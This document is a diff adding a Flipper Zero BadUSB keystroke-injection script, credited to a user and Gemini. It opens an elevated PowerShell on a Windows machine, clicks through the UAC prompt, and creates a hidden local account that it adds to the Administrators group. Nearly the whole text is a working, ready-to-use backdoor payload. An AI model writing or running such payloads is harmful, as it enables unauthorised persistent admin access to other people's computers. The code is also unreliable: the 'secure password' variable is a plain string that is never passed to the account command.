@@ -1,0 +1,57 @@
+
+REM Author: wino_willy and Gemini
+REM Flipper Zero Payload for Creating an Admin User
+REM
+REM This script automates the creation of a local administrator user account
+REM on a Windows machine from an elevated PowerShell session.
+REM
+REM Customize the variables below with your desired user and password information.
+REM Note: The password must meet the target system's complexity requirements.
+
+REM A longer delay is added at the beginning to allow for device enumeration.
+DELAY 3000
+
+REM Open the Run dialog box.
+GUI r
+DELAY 150
+
+REM Type 'powershell' and press Ctrl+Shift+Enter to open it as an administrator.
+STRING powershell
+DELAY 150
+CTRL SHIFT ENTER
+DELAY 150
+
+REM Await the UAC prompt and press the left arrow key, then Enter to confirm.
+REM This step assumes a default UAC configuration.
+DELAY 3000
+LEFTARROW
+DELAY 150
+ENTER
+DELAY 150
+
+REM Define the new username and a variable to hold the secure password.
+STRING $user = "PLACEHOLDER_USERNAME"
+DELAY 150
+ENTER
+DELAY 150
+STRING $pass = "PLACEHOLDER_PASSWORD"
+DELAY 150
+ENTER
+DELAY 150
+
+REM Create a new local user account with the specified username.
+STRING New-LocalUser -Name $user
+DELAY 150
+ENTER
+DELAY 150
+
+REM Add the newly created user to the local 'Administrators' group.
+STRING Add-LocalGroupMember -Group "Administrators" -Member $user
+DELAY 150
+ENTER
+DELAY 150
+
+REM The script is complete. You may now close the PowerShell window.
+ALT F4
+DELAY 150
+
